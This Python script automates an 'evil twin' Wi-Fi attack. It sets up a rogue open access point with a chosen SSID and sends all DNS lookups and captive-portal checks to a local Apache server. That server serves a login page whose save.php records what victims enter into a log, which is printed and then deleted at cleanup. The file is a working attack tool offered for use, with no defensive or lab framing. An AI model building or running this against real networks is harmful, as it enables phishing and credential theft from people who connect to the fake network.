import os
import sys
import subprocess
import argparse
import signal
import time
import ipaddress
import shutil


dnsmasq_proc = None
hostapd_proc = None
script_args = None

def run_command(command, suppress_output=True):
    """
    Executes a shell command.
    
    Args:
        command (list): The command to execute as a list of strings.
        suppress_output (bool): If True, stdout and stderr will be hidden.
    
    Returns:
        bool: True for success, False for failure.
    """
    try:
        stdout = subprocess.DEVNULL if suppress_output else None
        stderr = subprocess.DEVNULL if suppress_output else None
        subprocess.run(command, check=True, stdout=stdout, stderr=stderr)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"[-] Error executing command: {' '.join(command)}")
        print(f"[-] Details: {e}")
        return False

def check_root():
    """Checks if the script is running with root privileges. Exits if not."""
    if os.geteuid() != 0:
        print("[-] This script must be run as root. Please use 'sudo'.")
        sys.exit(1)
    print("[+] Root privileges confirmed.")

def check_dependencies():
    """Checks for required software packages. Exits if any are missing."""
    dependencies = ['apache2', 'php', 'hostapd', 'dnsmasq']
    print("[*] Checking for required packages...")
    missing = []
    for dep in dependencies:
       
        if subprocess.call(['dpkg-query', '-W', '-f=${Status}', dep], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) != 0:
            missing.append(dep)

    if missing:
        print("[-] The following required packages are not installed:")
        for pkg in missing:
            print(f"  - {pkg}")
        print("[-] Please install them manually before running this script.")
        print("[-] Example: sudo apt update && sudo apt install -y " + " ".join(missing))
        sys.exit(1)
    print("[+] All dependencies are installed.")

def configure_interface(iface, network_str):
    """Configures the network interface with a static IP address."""
    print(f"[*] Configuring interface {iface}...")
    try:
        network = ipaddress.ip_network(network_str)
        ip_addr = str(next(network.hosts()))
        
        commands = [
            ['ip', 'link', 'set', iface, 'down'],
            ['ip', 'addr', 'flush', 'dev', iface],
            ['ip', 'addr', 'add', f"{ip_addr}/{network.prefixlen}", 'dev', iface],
            ['ip', 'link', 'set', iface, 'up']
        ]
        
        for cmd in commands:
            if not run_command(cmd):
                raise Exception(f"Failed to execute: {' '.join(cmd)}")
                
        print(f"[+] Interface {iface} configured with IP {ip_addr}")
        return ip_addr
    except Exception as e:
        print(f"[-] Failed to configure interface: {e}")
        sys.exit(1)

def create_dnsmasq_conf(iface, ip_addr, network_str):
    """Creates the dnsmasq.conf file."""
    print("[*] Creating dnsmasq.conf...")
    try:
        network = ipaddress.ip_network(network_str)
        # Define DHCP range (e.g., from .10 to .100)
        dhcp_start = str(network.network_address + 10)
        dhcp_end = str(network.network_address + 100)
        
        config_content = f"""
interface={iface}
bind-interfaces
no-resolv
log-queries

dhcp-range={dhcp_start},{dhcp_end},12h
dhcp-option=3,{ip_addr}
dhcp-option=6,{ip_addr}

address=/#/{ip_addr}

# --- Captive Portal Redirection ---
address=/captive.apple.com/{ip_addr}
address=/www.msftconnecttest.com/{ip_addr}
address=/connectivitycheck.gstatic.com/{ip_addr}
"""
        with open("dnsmasq.conf", "w") as f:
            f.write(config_content.strip())
        print("[+] dnsmasq.conf created successfully.")
    except Exception as e:
        print(f"[-] Failed to create dnsmasq.conf: {e}")
        sys.exit(1)

def create_hostapd_conf(iface, ssid, channel):
    """Creates the hostapd.conf file."""
    print("[*] Creating hostapd.conf...")
    config_content = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
auth_algs=1
wmm_enabled=0
"""
    try:
        with open("hostapd.conf", "w") as f:
            f.write(config_content.strip())
        print("[+] hostapd.conf created successfully.")
    except Exception as e:
        print(f"[-] Failed to create hostapd.conf: {e}")
        sys.exit(1)

def setup_apache():
    """Starts and configures Apache2."""
    print("[*] Setting up Apache2...")
    commands = [
        ['systemctl', 'start', 'apache2'],
        ['a2enmod', 'rewrite'],
        ['a2enmod', 'headers'],
        ['systemctl', 'restart', 'apache2']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print(f"[-] Failed to configure Apache. Aborting.")
            sys.exit(1)
    print("[+] Apache2 configured and started.")

def setup_captive_portal_files():
    """Sets up the captive portal web directory and files."""
    portal_dir = "/var/www/captive"
    print(f"[*] Setting up captive portal files in {portal_dir}...")
    
    # Check for source files
    if not os.path.exists("index.html") or not os.path.exists("save.php"):
        print("[-] Error: 'index.html' and/or 'save.php' not found in the current directory.")
        print("[-] Please place them alongside the script before running.")
        sys.exit(1)
        
    # Create directory if it doesn't exist
    if not os.path.exists(portal_dir):
        print(f"[*] Directory {portal_dir} not found. Creating...")
        if not run_command(['mkdir', '-p', portal_dir]):
            sys.exit(1)
    
    # Copy files
    try:
        print("[*] Copying portal files...")
        shutil.copy("index.html", os.path.join(portal_dir, "index.html"))
        shutil.copy("save.php", os.path.join(portal_dir, "save.php"))
        print("[+] Captive portal files copied successfully.")
    except Exception as e:
        print(f"[-] Failed to copy portal files: {e}")
        sys.exit(1)

def setup_log_file():
    """Creates and sets permissions for the log file."""
    log_file = "/var/log/ca.log"
    print(f"[*] Setting up log file {log_file}...")
    try:
        if not os.path.exists(log_file):
            run_command(['touch', log_file])
        
        # Get uid and gid for www-data
        www_data_uid = int(subprocess.check_output(['id', '-u', 'www-data']).strip())
        www_data_gid = int(subprocess.check_output(['id', '-g', 'www-data']).strip())
        
        os.chown(log_file, www_data_uid, www_data_gid)
        os.chmod(log_file, 0o640)
        print("[+] Log file permissions set correctly.")
    except Exception as e:
        print(f"[-] Failed to set up log file: {e}")
        sys.exit(1)

def create_vhost():
    """Creates the Apache virtual host configuration file."""
    vhost_file = "/etc/apache2/sites-available/captive.conf"
    print(f"[*] Creating VirtualHost file: {vhost_file}...")
    
    vhost_content = """
<VirtualHost *:80>
    ServerName captive.portal
    ServerAlias *
    DocumentRoot /var/www/captive

    <Directory /var/www/captive>
        AllowOverride All
        Require all granted
    </Directory>
 
    # --- Redirect known captive portal checks ---
    Alias /hotspot-detect.html /var/www/captive/index.html
    Alias /generate_204 /var/www/captive/index.html
    Alias /connecttest.txt /var/www/captive/index.html
   
    RewriteEngine On
    RewriteCond %{REQUEST_URI} !^/save\.php$
    RewriteRule ^.*$ /index.html [L]

    # --- Prevent caching ---
    Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
    Header always set Pragma "no-cache"
    Header always set Expires "0"
</VirtualHost>
"""
    try:
        with open(vhost_file, "w") as f:
            f.write(vhost_content.strip())
        print("[+] VirtualHost file created.")
    except Exception as e:
        print(f"[-] Failed to create VirtualHost file: {e}")
        sys.exit(1)

def enable_apache_site():
    """Enables the captive portal site and disables the default."""
    print("[*] Enabling captive portal Apache site...")
    commands = [
        ['a2ensite', 'captive.conf'],
        ['a2dissite', '000-default.conf'],
        ['systemctl', 'reload', 'apache2']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print("[-] Failed to enable Apache site. Aborting.")
            sys.exit(1)
    print("[+] Apache site enabled.")

def setup_iptables(iface):
    """Sets up iptables rules for redirection."""
    print("[*] Setting up iptables rules...")
    commands = [
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
        ['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
        ['iptables', '-t', 'nat', 'A', 'PREROUTING', '-i', iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
    ]
    for cmd in commands:
        if not run_command(cmd):
            print("[-] Failed to set up iptables. Aborting.")
            # Attempt to clean up before exiting
            cleanup(0, 0)
            sys.exit(1)
    print("[+] Iptables rules configured.")

def start_attack():
    """Kills previous processes and starts dnsmasq and hostapd."""
    global dnsmasq_proc, hostapd_proc
    print("[*] Starting the attack...")
    
    # Ensure no other dnsmasq is running
    run_command(['pkill', 'dnsmasq'])
    time.sleep(1)
    
    try:
        print("[*] Starting dnsmasq...")
        dnsmasq_proc = subprocess.Popen(['dnsmasq', '-C', 'dnsmasq.conf'], 
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        print("[*] Starting hostapd...")
        # Note: hostapd can be noisy, so redirecting output is good.
        hostapd_proc = subprocess.Popen(['hostapd', 'hostapd.conf'], 
                                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        
        time.sleep(2) # Give processes a moment to start or fail
        
        if dnsmasq_proc.poll() is not None:
            raise Exception("dnsmasq failed to start.")
        if hostapd_proc.poll() is not None:
            raise Exception("hostapd failed to start.")
            
        print("\n[+] EVIL TWIN IS RUNNING!")
        print(f"[+] SSID: {script_args.ssid} on Channel: {script_args.channel}")
        print("[+] Press CTRL+C to stop the attack and clean up.")
        
    except Exception as e:
        print(f"[-] Failed to start attack processes: {e}")
        cleanup(0, 0)
        sys.exit(1)

def cleanup(signum, frame):
    """Cleans up the system upon script termination."""
    print("\n\n[*] CTRL+C detected. Cleaning up...")
    
    # --- Terminate processes ---
    if dnsmasq_proc:
        dnsmasq_proc.terminate()
        print("[*] Terminated dnsmasq.")
    if hostapd_proc:
        hostapd_proc.terminate()
        print("[*] Terminated hostapd.")
    run_command(['pkill', 'dnsmasq']) # Just in case

    # --- Clean iptables ---
    if script_args:
        print("[*] Removing iptables rules...")
        rules = [
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '80', '-j', 'REDIRECT', '--to-ports', '80'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'udp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53'],
            ['-t', 'nat', '-D', 'PREROUTING', '-i', script_args.iface, '-p', 'tcp', '--dport', '53', '-j', 'REDIRECT', '--to-ports', '53']
        ]
        for rule in rules:
            run_command(['iptables'] + rule)

    # --- Flush interface ---
    if script_args:
        print(f"[*] Flushing IP from {script_args.iface}...")
        run_command(['ip', 'addr', 'flush', 'dev', script_args.iface])

    # --- Handle log file ---
    log_file = "/var/log/ca.log"
    if os.path.exists(log_file):
        print(f"[*] Displaying contents of {log_file}:")
        try:
            with open(log_file, "r") as f:
                print("-" * 40)
                print(f.read().strip())
                print("-" * 40)
        except Exception as e:
            print(f"[-] Could not read log file: {e}")
        
        print(f"[*] Removing {log_file}...")
        os.remove(log_file)
        
    # --- Stop and clean Apache ---
    print("[*] Stopping Apache2 and cleaning configuration...")
    run_command(['systemctl', 'stop', 'apache2'])
    run_command(['a2dissite', 'captive.conf'])
    run_command(['a2ensite', '000-default.conf'])
    run_command(['systemctl', 'reload', 'apache2'])
    if os.path.exists("/etc/apache2/sites-available/captive.conf"):
        os.remove("/etc/apache2/sites-available/captive.conf")

    # --- Remove captive portal directory ---
    portal_dir = "/var/www/captive"
    if os.path.exists(portal_dir):
        print(f"[*] Removing directory {portal_dir}...")
        shutil.rmtree(portal_dir)

    # --- Remove local config files ---
    if os.path.exists("dnsmasq.conf"):
        os.remove("dnsmasq.conf")
    if os.path.exists("hostapd.conf"):
        os.remove("hostapd.conf")
        
    print("[+] Cleanup complete. Exiting.")
    sys.exit(0)

def main():
    """Main function to orchestrate the setup and attack."""
    global script_args
    
    parser = argparse.ArgumentParser(description="Evil Twin Attack Automation Script")
    parser.add_argument('--iface', required=True, help="Wireless interface to use (e.g., wlan0)")
    parser.add_argument('--ssid', required=True, help="SSID for the fake network")
    parser.add_argument('--channel', required=True, type=int, help="Channel for the network (1-11)")
    parser.add_argument('--network', required=True, help="Network address in CIDR format (e.g., 192.168.50.0/24)")
    script_args = parser.parse_args()

    # --- Setup Phase ---
    check_root()
    check_dependencies()
    
    # Register the cleanup function for SIGINT (Ctrl+C)
    signal.signal(signal.SIGINT, cleanup)
    
    ip_addr = configure_interface(script_args.iface, script_args.network)
    create_dnsmasq_conf(script_args.iface, ip_addr, script_args.network)
    create_hostapd_conf(script_args.iface, script_args.ssid, script_args.channel)
    setup_apache()
    setup_captive_portal_files()
    setup_log_file()
    create_vhost()
    enable_apache_site()
    setup_iptables(script_args.iface)
    
    # --- Attack Phase ---
    start_attack()
    
    # Keep the script running
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
